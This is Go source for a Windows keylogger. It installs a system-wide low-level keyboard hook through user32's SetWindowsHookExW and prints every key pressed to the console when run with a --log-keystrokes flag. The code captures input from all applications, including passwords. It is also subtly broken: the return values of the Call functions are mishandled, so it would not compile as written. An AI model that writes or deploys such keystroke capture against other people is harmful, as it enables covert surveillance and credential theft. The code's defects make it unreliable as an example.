//go:build windows
// +build windows
package main

import (
	"flag"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32                  = windows.NewLazySystemDLL("user32.dll")
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procGetMessageW         = user32.NewProc("GetMessageW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	keyboardHook            windows.Handle
	virtualKeyCodeMap       map[uint32]string
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

func main() {
	execute := flag.Bool("log-keystrokes", false, "Log keystrokes")
	flag.Parse()

	if *execute {
		fmt.Println("Logging keystrokes...")
		initVirtualKeyCodeMap()
		keyLog()
	} else {
		fmt.Println("Use --log-keystrokes flag to start the logging process")
		flag.PrintDefaults()
	}
}

func keyLog() {
	keyboardHook, _, _ = procSetWindowsHookExW.Call(
		WH_KEYBOARD_LL,
		syscall.NewCallback(keyboardCallback),
		0,
		0,
	)

	var msg windows.MSG
	for {
		procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
	}
}

func keyboardCallback(nCode int, wparam, lparam uintptr) uintptr {
	if nCode >= 0 && wparam == WM_KEYDOWN {
		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
		keyCode := kbdStruct.VkCode
		keyName, exists := virtualKeyCodeMap[keyCode]
		if exists {
			fmt.Printf("Key pressed: %s\n", keyName)
		} else {
			fmt.Printf("Key pressed: %d\n", keyCode)
		}
	}
	return procCallNextHookEx.Call(keyboardHook, uintptr(nCode), wparam, lparam)
}

func initVirtualKeyCodeMap() {
	virtualKeyCodeMap = map[uint32]string{
		0x08: "BACKSPACE",
		0x09: "TAB",
		0x0D: "ENTER",
		0x10: "SHIFT",
		0x11: "CTRL",
		0x12: "ALT",
		0x14: "CAPS LOCK",
		0x1B: "ESC",
		0x20: "SPACEBAR",
		0x25: "LEFT ARROW",
		0x26: "UP ARROW",
		0x27: "RIGHT ARROW",
		0x28: "DOWN ARROW",
		// Add more key mappings as needed
	}
}